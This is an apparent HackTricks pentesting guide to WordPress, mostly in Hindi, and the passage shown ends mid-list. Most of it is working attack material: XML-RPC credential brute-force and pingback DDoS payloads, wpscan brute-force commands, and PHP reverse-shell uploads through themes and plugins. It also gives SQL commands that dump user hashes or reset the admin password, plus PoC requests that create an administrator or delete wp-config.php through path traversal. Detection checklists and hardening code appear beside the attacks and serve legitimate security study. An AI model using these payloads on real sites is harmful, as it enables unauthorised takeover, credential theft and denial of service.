# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## बुनियादी जानकारी

- **Uploaded** फ़ाइलें जाती हैं: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Themes files can be found in /wp-content/themes/,** इसलिए अगर आप theme के कुछ php को बदलकर RCE पाना चाहें तो आप संभवतः उस path का उपयोग करेंगे। उदाहरण के लिए: Using **theme twentytwelve** आप **access** कर सकते हैं **404.php** फ़ाइल को: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Another useful url could be:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- `wp-config.php` में आप database का root password पा सकते हैं।
- जाँचने के लिए डिफ़ॉल्ट लॉगिन पाथ: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Main WordPress Files**

- `index.php`
- `license.txt` में उपयोगी जानकारी होती है जैसे कि इंस्टॉल्ड WordPress का version।
- `wp-activate.php` नए WordPress साइट की सेटअप के दौरान email activation प्रक्रिया के लिए उपयोग किया जाता है।
- Login फ़ोल्डर (छुपाने के लिए नाम बदला गया हो सकता है):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` एक फ़ाइल है जो WordPress की उस फ़ीचर का प्रतिनिधित्व करती है जो HTTP को transport mechanism के रूप में और XML को encoding mechanism के रूप में उपयोग करके डेटा को ट्रांसमिट करने में सक्षम बनाती है। इस प्रकार के संचार को WordPress के [REST API](https://developer.wordpress.org/rest-api/reference) ने बदल दिया है।
- `wp-content` फ़ोल्डर वह मुख्य डायरेक्टरी है जहाँ plugins और themes स्टोर होते हैं।
- `wp-content/uploads/` वह डायरेक्टरी है जहाँ प्लेटफ़ॉर्म पर अपलोड की गई कोई भी फ़ाइलें स्टोर होती हैं।
- `wp-includes/` यह डायरेक्टरी core फ़ाइलों के लिए है, जैसे certificates, fonts, JavaScript फ़ाइलें, और widgets।
- `wp-sitemap.xml` WordPress वर्ज़न 5.5 और उससे ऊपर में, WordPress सभी public पोस्ट और publicly queryable post types और taxonomies के साथ एक sitemap XML फ़ाइल जनरेट करता है।

**Post exploitation**

- `wp-config.php` फ़ाइल में वह जानकारी होती है जिसकी WordPress को database से कनेक्ट करने के लिए आवश्यकता होती है, जैसे database name, database host, username और password, authentication keys और salts, और database table prefix। इस configuration फ़ाइल का उपयोग DEBUG mode सक्रिय करने के लिए भी किया जा सकता है, जो troubleshooting में उपयोगी हो सकता है।

### उपयोगकर्ता अनुमतियाँ

- **Administrator**
- **Editor**: अपने और दूसरों के पोस्ट प्रकाशित और प्रबंधित करता है
- **Author**: अपने स्वयं के पोस्ट प्रकाशित और प्रबंधित करता है
- **Contributor**: पोस्ट लिखता और प्रबंधित करता है लेकिन प्रकाशित नहीं कर सकता
- **Subscriber**: पोस्ट ब्राउज़ करता है और अपना प्रोफ़ाइल अपडेट कर सकता है

## **Passive Enumeration**

### **Get WordPress version**

जाँचें कि क्या आप फ़ाइलें `/license.txt` या `/readme.html` ढूँढ सकते हैं

पेज के **source code** के अंदर (उदाहरण से [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- CSS लिंक फ़ाइलें

![](<../../images/image (533).png>)

- JavaScript फ़ाइलें

![](<../../images/image (524).png>)

### प्लगइन्स प्राप्त करें
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### थीम प्राप्त करें
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### सामान्य रूप से संस्करण निकालें
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## Active enumeration

### Plugins and Themes

आप शायद सभी Plugins और Themes खोज पाने में सक्षम नहीं होंगे। इन सबको खोजने के लिए, आपको **actively Brute Force a list of Plugins and Themes** करने की आवश्यकता होगी (खुशी की बात है कि हमारे लिए ऐसे स्वचालित टूल्स मौजूद हैं जिनमें ये सूचियाँ शामिल होती हैं)।

### Users

- **ID Brute:** आप Brute Forcing users IDs करके किसी WordPress साइट से valid users प्राप्त कर सकते हैं:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
यदि प्रतिक्रियाएँ **200** या **30X** हैं, तो इसका मतलब है कि id **valid** है। यदि प्रतिक्रिया **400** आती है, तो id **invalid** है।

- **wp-json:** आप users के बारे में जानकारी प्राप्त करने के लिए querying करके भी कोशिश कर सकते हैं:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
उपयोगकर्ताओं के बारे में कुछ जानकारी प्रकट कर सकने वाला एक और `/wp-json/` endpoint है:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
ध्यान दें कि यह endpoint केवल उन उपयोगकर्ताओं को एक्सपोज़ करता है जिन्होंने पोस्ट की है। **केवल उन उपयोगकर्ताओं की जानकारी प्रदान की जाएगी जिनके लिए यह फीचर सक्षम है।**

साथ ही ध्यान दें कि **/wp-json/wp/v2/pages** IP addresses leak कर सकता है।

- **Login username enumeration**: जब **`/wp-login.php`** पर लॉगिन करते हैं तो **संदेश** **भिन्न** होता है जो संकेत करता है कि **उपयोगकर्ता नाम मौजूद है या नहीं**।

### XML-RPC

यदि `xml-rpc.php` सक्रिय है तो आप credentials brute-force कर सकते हैं या इसका उपयोग अन्य संसाधनों पर DoS attacks लॉन्च करने के लिए कर सकते हैं। (उदाहरण के लिए आप इस प्रक्रिया को[ using this](https://github.com/relarizky/wpxploit) ऑटोमेट कर सकते हैं).

यह सक्रिय है या नहीं देखने के लिए _**/xmlrpc.php**_ तक पहुँचने का प्रयास करें और यह अनुरोध भेजें:

**जाँच करें**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** या **`metaWeblog.getUsersBlogs`** उनमें से कुछ मेथड हैं जिन्हें brute-force credentials के लिए उपयोग किया जा सकता है। अगर आप इनमें से कोई भी ढूँढ पाते हैं तो आप कुछ इस तरह भेज सकते हैं:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
The message _"Incorrect username or password"_ inside a 200 code response should appear if the credentials aren't valid.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

सही credentials का उपयोग करके आप एक file upload कर सकते हैं। response में path दिखाई देगा ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
इसके अलावा एक **तेज़ तरीका** है क्रेडेंशियल्स को brute-force करने का, जो **`system.multicall`** का उपयोग करता है क्योंकि आप एक ही request में कई क्रेडेंशियल्स आज़मा सकते हैं:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**2FA बायपास**

यह तरीका प्रोग्राम्स के लिए है, इंसानों के लिए नहीं, और पुराना है, इसलिए यह 2FA को सपोर्ट नहीं करता। तो, अगर आपके पास वैध क्रेडेंशियल्स हैं पर मुख्य प्रवेश 2FA द्वारा सुरक्षित है, **आप xmlrpc.php का दुरुपयोग करके उन क्रेडेंशियल्स से 2FA बायपास करते हुए login कर सकते हैं**। ध्यान दें कि आप console के माध्यम से जो सभी actions कर सकते हैं, वे आप नहीं कर पाएंगे, लेकिन आप फिर भी RCE तक पहुँचने में सक्षम हो सकते हैं जैसा कि Ippsec इसे [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s) में समझाते हैं

**DDoS या पोर्ट स्कैनिंग**

अगर आप सूची में _**pingback.ping**_ मेथड पा लेते हैं तो आप Wordpress को किसी भी host/port पर arbitrary request भेजवा सकते हैं.\
यह उपयोग किया जा सकता है कि **हज़ारों** Wordpress **साइट्स** से एक ही **स्थान** को **पहुंच** करवाया जाए (जिससे उस स्थान पर **DDoS** हो) या आप इसका उपयोग करके **Wordpress** को किसी आंतरिक **नेटवर्क** को **स्कैन** करवाने के लिए निर्देशित कर सकते हैं (आप कोई भी पोर्ट निर्दिष्ट कर सकते हैं)।
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

यदि आपको **faultCode** का मान **0** (17) से **बड़ा** मिलता है, तो इसका मतलब है कि पोर्ट खुला है।

पिछले सेक्शन में **`system.multicall`** के उपयोग को देखें ताकि आप सीख सकें कि इस विधि का दुरुपयोग करके कैसे DDoS किया जा सकता है।

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

यह फ़ाइल आम तौर पर Wordpress साइट की रूट में मौजूद रहती है: **`/wp-cron.php`**\
जब इस फ़ाइल को **accessed** किया जाता है, तो एक "**heavy**" MySQL **query** निष्पादित होती है, इसलिए इसे **attackers** द्वारा **DoS** को **cause** करने के लिए इस्तेमाल किया जा सकता है.\
डिफ़ॉल्ट रूप से, `wp-cron.php` हर पेज लोड पर (जब भी कोई क्लाइंट किसी भी Wordpress पेज का अनुरोध करता है) कॉल किया जाता है, जो उच्च-ट्रैफ़िक साइट्स पर समस्याएँ (DoS) पैदा कर सकता है।

यह सलाह दी जाती है कि Wp-Cron को disable कर दिया जाए और host के अंदर एक वास्तविक cronjob बनाया जाए जो आवश्यक क्रियाएँ नियमित अंतराल पर (बिना किसी समस्या के) चलाए।

### /wp-json/oembed/1.0/proxy - SSRF

Try to access _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ and the Worpress site may make a request to you.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

यह टूल जांचता है कि **methodName: pingback.ping** और path **/wp-json/oembed/1.0/proxy** मौजूद हैं या नहीं, और यदि मौजूद हों तो यह उन्हें exploit करने की कोशिश करता है।

## स्वचालित टूल्स
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## एक बिट ओवरराइट कर के एक्सेस प्राप्त करें

यह असल हमले से ज्यादा एक जिज्ञासा है। CTF में [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) आप किसी भी wordpress फ़ाइल का 1 बिट फ्लिप कर सकते थे। इसलिए आप फ़ाइल `/var/www/html/wp-includes/user.php` के पोजीशन `5389` का बिट फ्लिप करके NOT (`!`) ऑपरेशन को NOP कर सकते थे।
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **पैनल RCE**

**थीम में उपयोग किए गए php को संशोधित करना (admin credentials की आवश्यकता होती है)**

Appearance → Theme Editor → 404 Template (दाईं ओर)

php shell के लिए सामग्री बदलें:

![](<../../images/image (384).png>)

इंटरनेट पर खोजें कि आप उस अपडेट किए गए पेज तक कैसे एक्सेस कर सकते हैं। इस मामले में आपको यहाँ एक्सेस करना होगा: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

आप उपयोग कर सकते हैं:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
सेशन प्राप्त करने के लिए।

## Plugin RCE

### PHP plugin

यह संभव हो सकता है कि एक plugin के रूप में .php फाइलें अपलोड की जा सकें।\
उदाहरण के लिए अपना php backdoor बनाएं:

![](<../../images/image (183).png>)

फिर एक नया plugin जोड़ें:

![](<../../images/image (722).png>)

Upload plugin और Install Now दबाएँ:

![](<../../images/image (249).png>)

Procced पर क्लिक करें:

![](<../../images/image (70).png>)

शायद यह तुरंत कुछ नहीं करेगा, लेकिन यदि आप Media पर जाएँगे, तो आप अपना अपलोड किया हुआ shell देखेंगे:

![](<../../images/image (462).png>)

इसे एक्सेस करें और आप reverse shell को execute करने के लिए URL देखेंगे:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

यह तरीका एक ज्ञात vulnerable malicious plugin की इंस्टॉलेशन से संबंधित है जिसे exploit करके web shell प्राप्त किया जा सकता है। यह प्रक्रिया WordPress dashboard के माध्यम से निम्नानुसार की जाती है:

1. **Plugin Acquisition**: plugin को Exploit DB जैसे स्रोत से प्राप्त किया जाता है जैसे [**here**](https://www.exploit-db.com/exploits/36374).
2. **Plugin Installation**:
- WordPress dashboard में जाएँ, फिर `Dashboard > Plugins > Upload Plugin` पर जाएँ।
- डाउनलोड किए गए plugin की zip फाइल अपलोड करें।
3. **Plugin Activation**: एक बार plugin सफलतापूर्वक इंस्टॉल हो जाने पर, इसे dashboard के माध्यम से activate करना होगा।
4. **Exploitation**:
- जब `reflex-gallery` plugin इंस्टॉल और सक्रिय हो, तो इसे exploit किया जा सकता है क्योंकि यह ज्ञात रूप से vulnerable है।
- Metasploit framework इस vulnerability के लिए एक exploit प्रदान करता है। उपयुक्त मॉड्यूल लोड करके और विशिष्ट कमांड्स चलाकर, एक meterpreter session स्थापित किया जा सकता है, जो साइट तक अनाधिकृत पहुँच देता है।
- ध्यान दें कि यह WordPress साइट को exploit करने के कई तरीकों में से केवल एक है।

यह सामग्री WordPress dashboard में plugin इंस्टॉल और activate करने के चरणों को दर्शाने वाले विज़ुअल एड्स शामिल करती है। हालांकि, बिना उचित अनुमति के इस तरह vulnerabilities को exploit करना illegal और unethical है। यह जानकारी केवल जिम्मेदारीपूर्वक और कानूनी संदर्भ में उपयोग की जानी चाहिए, जैसे कि explicit permission के साथ penetration testing।

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## From XSS to RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ एक स्क्रिप्ट है जो एक **Cross-Site Scripting (XSS)** vulnerability को **Remote Code Execution (RCE)** या WordPress में अन्य critical vulnerabilities तक escalate करने के लिए डिज़ाइन की गई है। अधिक जानकारी के लिए [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html) देखें। यह **Wordpress Versions 6.X.X, 5.X.X and 4.X.X के लिए support प्रदान करता है और इसे निम्न कार्य करने की अनुमति देता है:**
- _**Privilege Escalation:**_ WordPress में एक user बनाता है।
- _**(RCE) Custom Plugin (backdoor) Upload:**_ अपना custom plugin (backdoor) WordPress पर upload करें।
- _**(RCE) Built-In Plugin Edit:**_ WordPress में Built-In Plugins को edit करें।
- _**(RCE) Built-In Theme Edit:**_ WordPress में Built-In Themes को edit करें।
- _**(Custom) Custom Exploits:**_ Third-Party WordPress Plugins/Themes के लिए custom exploits।

## Post Exploitation

यूजरनेम और पासवर्ड निकालें:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
admin पासवर्ड बदलें:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Plugins Pentest

### Attack Surface

यह जानना कि एक Wordpress plugin कैसे functionality एक्सपोज़ कर सकता है, उसकी functionality में vulnerabilities खोजने के लिए ज़रूरी है। आप निम्न बुलेट पॉइंट्स में देख सकते हैं कि कोई plugin कैसे functionality एक्सपोज़ कर सकता है और कुछ vulnerable plugins के उदाहरण [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/) में दिए गए हैं।

- **`wp_ajax`**

एक plugin अपने functions को users के लिए एक्सपोज़ करने के तरीकों में से एक AJAX handlers के माध्यम से कर सकता है। इनमें लॉजिक, authorization, या authentication बग्स हो सकते हैं। इसके अलावा, अक्सर ऐसा होता है कि ये functions authentication और authorization दोनों को एक wordpress nonce की मौजूदगी पर आधारित कर देते हैं, जो **Wordpress instance में प्रमाणीकृत कोई भी user के पास हो सकता है** (उसकी role के बावजूद)।

These are the functions that can be used to expose a function in a plugin:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**`nopriv` का उपयोग endpoint को किसी भी उपयोगकर्ता (यहाँ तक कि अप्रमाणित उपयोगकर्ताओं) के लिए पहुँच योग्य बना देता है।**

> [!CAUTION]
> इसके अलावा, यदि फ़ंक्शन केवल उपयोगकर्ता के प्राधिकरण की जाँच के लिए `wp_verify_nonce` फ़ंक्शन का उपयोग कर रहा है, तो यह फ़ंक्शन केवल यह जाँचता है कि उपयोगकर्ता लॉग इन है; यह आमतौर पर उपयोगकर्ता की भूमिका की जाँच नहीं करता। इसलिए कम-विशेषाधिकार उपयोगकर्ताओं को उच्च-विशेषाधिकार वाली क्रियाओं तक पहुँच मिल सकती है।

- **REST API**

यह भी संभव है कि wordpress से फ़ंक्शन को `register_rest_route` फ़ंक्शन का उपयोग करके rest AP में रजिस्टर करके एक्सपोज़ किया जाए:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
The `permission_callback` एक callback फ़ंक्शन है जो जाँचता है कि कोई दिए गए user को API method कॉल करने के लिए अधिकृत है या नहीं।

**यदि built-in `__return_true` फ़ंक्शन उपयोग किया गया है, तो यह user permissions चेक को सीधे स्किप कर देगा।**

- **php फ़ाइल तक सीधे एक्सेस**

बेशक, Wordpress PHP का उपयोग करता है और plugins के अंदर की फाइलें वेब से सीधे उपलब्ध होती हैं। इसलिए, अगर कोई plugin ऐसी कोई कमजोर फ़ंक्शनैलिटी एक्सपोज़ कर रहा है जो केवल फाइल तक पहुँचने से ट्रिगर हो जाती हो, तो वह किसी भी user द्वारा शोषित की जा सकती है।

### Trusted-header REST impersonation (WooCommerce Payments ≤ 5.6.1)

कुछ plugins internal integrations या reverse proxies के लिए “trusted header” शॉर्टकट लागू करते हैं और फिर उस header का उपयोग REST requests के लिए current user context सेट करने में करते हैं। यदि वह header किसी upstream component द्वारा अनुरोध के साथ cryptographically bound नहीं है, तो एक attacker उसे spoof करके administrator के रूप में privileged REST routes तक पहुँच सकता है।

- प्रभाव: अप्रमाणित privilege escalation — core users REST route के माध्यम से नया administrator बनाकर admin privileges प्राप्त करना।
- Example header: `X-Wcpay-Platform-Checkout-User: 1` (user ID 1 को force करता है, जो आमतौर पर पहला administrator account होता है)।
- Exploited route: `POST /wp-json/wp/v2/users` एक elevated role array के साथ।

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
क्यों यह काम करता है

- प्लगइन एक क्लाइंट-नियंत्रित हेडर को प्रमाणीकरण स्थिति से मैप करता है और capability checks को स्किप कर देता है।
- WordPress कोर इस रूट के लिए `create_users` capability की अपेक्षा करता है; प्लगइन hack इसे बायपास करता है हेडर से current user context सीधे सेट करके।

अपेक्षित सफलता संकेतक

- HTTP 201 एक JSON बॉडी के साथ जो बनाए गए user का वर्णन करती है।
- `wp-admin/users.php` में दिखाई देने वाला एक नया admin user।

डिटेक्शन चेकलिस्ट

- `getallheaders()`, `$_SERVER['HTTP_...']` के लिए grep करें, या vendor SDKs जो custom headers पढ़कर user context सेट करते हैं (उदा., `wp_set_current_user()`, `wp_set_auth_cookie()`).
- उन REST registrations की समीक्षा करें जहां privileged callbacks मजबूत `permission_callback` जांचों के बिना हैं और इसके बजाय request headers पर भरोसा करते हैं।
- REST handlers के अंदर core user-management functions (`wp_insert_user`, `wp_create_user`) के उपयोग देखें जो केवल header values द्वारा gated हैं।

कठोरकरण

- कभी भी authentication या authorization को client-controlled headers से व्युत्पन्न न करें।
- यदि किसी reverse proxy को identity inject करनी ही हो, तो proxy पर trust terminate करें और inbound copies को strip करें (उदा., edge पर `unset X-Wcpay-Platform-Checkout-User`), फिर signed token पास करें और उसे server-side verify करें।
- privileged actions करने वाले REST routes के लिए `current_user_can()` जांच और एक सख्त `permission_callback` आवश्यक करें (कृपया `__return_true` का उपयोग न करें)।
- header “impersonation” के बजाय first-party auth (cookies, application passwords, OAuth) को प्राथमिकता दें।

संदर्भ: सार्वजनिक केस और व्यापक विश्लेषण के लिए इस पृष्ठ के अंत में दिए लिंक देखें।

### wp_ajax_nopriv के माध्यम से अनप्रमाणीकृत मनमाना फ़ाइल विलोपन (Litho Theme <= 3.0)

WordPress themes और plugins अक्सर `wp_ajax_` और `wp_ajax_nopriv_` hooks के माध्यम से AJAX handlers expose करते हैं। जब **_nopriv_** variant का उपयोग किया जाता है तो **callback अनप्रमाणीकृत विज़िटर्स द्वारा पहुँच योग्य हो जाता है**, इसलिए किसी भी संवेदनशील क्रिया को अतिरिक्त रूप से निम्न लागू करना चाहिए:

1. एक **capability जांच** (जैसे `current_user_can()` या कम से कम `is_user_logged_in()`), और
2. एक **CSRF nonce** जिसे `check_ajax_referer()` / `wp_verify_nonce()` से वैध किया गया हो, और
3. **कठोर इनपुट sanitisation / validation**।

Litho multipurpose theme (< 3.1) ने *Remove Font Family* फीचर में उन 3 नियंत्रणों को भूल गया और अंततः निम्नलिखित कोड (सरलीकृत) भेज दिया:
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
इस स्निपेट से उत्पन्न समस्याएँ:

* **प्रमाणीकरण रहित एक्सेस** – `wp_ajax_nopriv_` हुक पंजीकृत है।
* **No nonce / capability check** – कोई भी विज़िटर इस endpoint को हिट कर सकता है।
* **No path sanitisation** – उपयोगकर्ता-नियंत्रित `fontfamily` स्ट्रिंग को बिना फ़िल्टर किए फ़ाइलसिस्टम पाथ के साथ जोड़ दिया जाता है, जिससे क्लासिक `../../` traversal संभव हो जाता है।

#### शोषण

एक हमलावर एक ही HTTP POST request भेजकर **uploads बेस डायरेक्टरी के नीचे** (सामान्यतः `<wp-root>/wp-content/uploads/`) की किसी भी फ़ाइल या डायरेक्टरी को डिलीट कर सकता है:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
चूँकि `wp-config.php` *uploads* के बाहर रहता है, एक डिफ़ॉल्ट इंस्टॉलेशन में चार `../` sequences काफी होते हैं। `wp-config.php` को डिलीट करने पर अगली विज़िट पर WordPress *installation wizard* में चला जाता है, जिससे साइट का पूरा कब्ज़ा संभव हो जाता है (आक्रमणकर्ता केवल नई DB configuration देता है और एक admin user बना लेता है)।

अन्य प्रभावशाली लक्ष्य plugin/theme `.php` files (security plugins को तोड़ने के लिए) या `.htaccess` rules हो सकते हैं।

#### डिटेक्शन चेकलिस्ट

* कोई भी `add_action( 'wp_ajax_nopriv_...')` callback जो filesystem helpers (`copy()`, `unlink()`, `$wp_filesystem->delete()`, आदि) को कॉल करता है।
* paths में unsanitised user input का concatenation (देखें `$_POST`, `$_GET`, `$_REQUEST`)।
* `check_ajax_referer()` और `current_user_can()`/`is_user_logged_in()` की अनुपस्थिति।

#### हार्डनिंग
```php
function secure_remove_font_family() {
if ( ! is_user_logged_in() ) {
wp_send_json_error( 'forbidden', 403 );
}
check_ajax_referer( 'litho_fonts_nonce' );

$fontfamily = sanitize_file_name( wp_unslash( $_POST['fontfamily'] ?? '' ) );
$srcdir = trailingslashit( wp_upload_dir()['basedir'] ) . 'litho-fonts/' . $fontfamily;

if ( ! str_starts_with( realpath( $srcdir ), realpath( wp_upload_dir()['basedir'] ) ) ) {
wp_send_json_error( 'invalid path', 400 );
}
// … proceed …
}
add_action( 'wp_ajax_litho_remove_font_family_action_data', 'secure_remove_font_family' );
//  🔒  NO wp_ajax_nopriv_ registration
```
> [!TIP]
> **Always** किसी भी disk पर write/delete operation को privileged मानें और डबल-चेक करें:
> • Authentication  • Authorisation  • Nonce  • Input sanitisation  • Path containment (e.g. via `realpath()` plus `str_starts_with()`).

---

### Privilege escalation via stale role restoration and missing authorization (ASE "View Admin as Role")

कई plugins 'view as role' या temporary role-switching फीचर implement करते हैं, जो original role(s) को user meta में सेव करके बाद में restore करने के लिए रखते हैं। अगर restoration path केवल request parameters (e.g., `$_REQUEST['reset-for']`) और plugin-maintained सूची पर निर्भर करता है बिना capabilities चेक और valid nonce की जाँच किए, तो यह एक vertical privilege escalation बन जाता है।

एक वास्तविक उदाहरण Admin and Site Enhancements (ASE) plugin (≤ 7.6.2.1) में मिला। reset ब्रांच ने roles को `reset-for=<username>` के आधार पर restore किया यदि username internal array `$options['viewing_admin_as_role_are']` में दिखाई देता था, लेकिन उसने current roles को हटाने और user meta `_asenha_view_admin_as_original_roles` से saved roles को वापस जोड़ने से पहले न तो `current_user_can()` चेक किया और न ही nonce verification की:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
क्यों यह शोषणयोग्य है

- `$_REQUEST['reset-for']` और एक प्लगइन विकल्प पर सर्वर-साइड प्राधिकरण के बिना भरोसा करता है।
- यदि किसी उपयोगकर्ता के पास पहले `_asenha_view_admin_as_original_roles` में उच्चाधिकार सुरक्षित थे और उसे डाउनग्रेड कर दिया गया, तो वे reset path पर जाकर उन्हें पुनर्स्थापित कर सकते हैं।
- कुछ deployments में, कोई भी प्रमाणीकृत उपयोगकर्ता `viewing_admin_as_role_are` में अभी भी मौजूद किसी अन्य username के लिए reset ट्रिगर कर सकता है (टूटी हुई प्राधिकरण)।

हमले की आवश्यकताएँ

- फीचर सक्षम होने वाला असुरक्षित प्लगइन संस्करण।
- लक्षित खाते में पहले उपयोग से user meta में बचा हुआ उच्च-प्रिविलेज रोल मौजूद होना।
- कोई भी प्रमाणीकृत सत्र; reset फ्लो पर nonce/capability का अभाव।

शोषण (उदाहरण)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
On vulnerable builds यह current roles हटा देता है और saved original roles (e.g., `administrator`) को फिर से जोड़ देता है, प्रभावी रूप से privileges escalate कर देता है।

Detection checklist

- Role-switching features की तलाश करें जो user meta में “मूल भूमिकाएँ” persist करती हैं (e.g., `_asenha_view_admin_as_original_roles`)।
- उन reset/restore paths की पहचान करें जो:
